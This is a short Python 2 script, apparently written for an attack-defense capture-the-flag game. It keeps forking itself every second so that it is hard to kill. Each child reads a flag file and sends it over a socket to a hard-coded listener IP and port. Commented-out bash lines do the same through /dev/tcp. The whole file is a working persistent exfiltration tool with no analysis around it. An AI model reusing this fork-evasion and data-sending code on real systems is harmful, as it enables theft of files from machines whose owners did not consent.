#coding:utf-8
from multiprocessing import Process
from time import sleep
from subprocess import Popen
from os import system
from os import fork
# import IPython

#forkfreq尽量越小越好，
#linktimeout最好小于forkfreq
forkfreq=1
linktimeout=0.5


targetip="202.112.50.114" #设置监听ip
targetport=9001 #设置送往监听的端口


cmd1 ='''\
python2.7 -c \'
import os
import time
import socket

target_host="{ip}"
target_port={port}

if not int(time.time())%2:
    f=open("/home/ckx/ctfplatform/flag")
    flag=f.read(40)
    client=socket.socket()
    client.settimeout({linktimeout})
    try:
        client.connect((target_host,target_port))
        client.send(flag)
    except:
        pass
    f.close()
    client.close()
    print "oooook!!!!!!!!!"
\' 1>/dev/null 2>/dev/null
'''.format(ip=targetip,port=targetport,linktimeout=linktimeout)
# bash -c 'cat /home/ckx/ctfplatform/flag >& /dev/tcp/202.112.50.114/9898 0>&1'

# cat /home/ckx/ctfplatform/flag >& /dev/tcp/202.112.50.114/9898 0>&1
while 1:
    sleep(forkfreq)  #这个控制了能被杀死的时间窗口应该小一点比较好
    try:
        pid = fork()

        if pid == 0:  
         
            print "ssssss"
            Popen(cmd1,shell = True)
            # sleep(4)
            print "this is child process.source " 
        else: 
            print "this is parent process.source " 
            exit(0)
    except OSError, e:
        pass

print "main process end"
# Process()
